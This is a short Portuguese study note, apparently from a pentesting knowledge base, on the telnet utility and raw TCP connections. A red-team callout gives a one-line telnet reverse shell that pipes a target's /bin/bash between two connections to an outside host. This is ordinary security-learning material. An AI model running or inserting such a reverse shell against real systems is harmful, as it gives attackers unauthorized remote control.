É um utilitário que, se utilizado com a porta `TCP/23`, implementa o protocolo [[5. Telnet]]. Também é muito usado simplesmente com um "pass‑through de bytes" via protocolo [[5. TCP]], usado para enviar dados brutos para a outra ponta da conexão, similar ao [[1. ncat]].

Exemplo simples de conexão com um host:

```shell
$ telnet host port
```

Com a conexão estabelecida, é possível enviar e receber dados do host, assim como no `ncat`.

> [!redteam] Reverse Shell com `telnet`
> Mesmo sendo um utilitário simples, ainda é possível utiliza-lo para fazer um [[5. Reverse Shell]], contudo com alguns passos adicionais. Diferente do [[1. ncat]], o `telnet` não tem nenhum mecanismo por padrão para executar algum binário e ligar seu `stdin/stdout` com o socket de conexão.
> 
> Contudo, é possível simular esse comportamento ao estabelecer a conexão com `telnet`, redirecionar a saída para um `/bin/bash` e redirecionar a saída do `/bin/bash` para outra conexão `telnet`:
> ```shell
> # dentro do host alvo
> $ telnet 192.168.0.10 1000 | /bin/bash | telnet 192.168.0.10 1001
> ``` 
> Dessa forma, o host alvo se conectará com você por duas sessões diferentes: uma irá receber seu input enquanto a outra retornará o output.
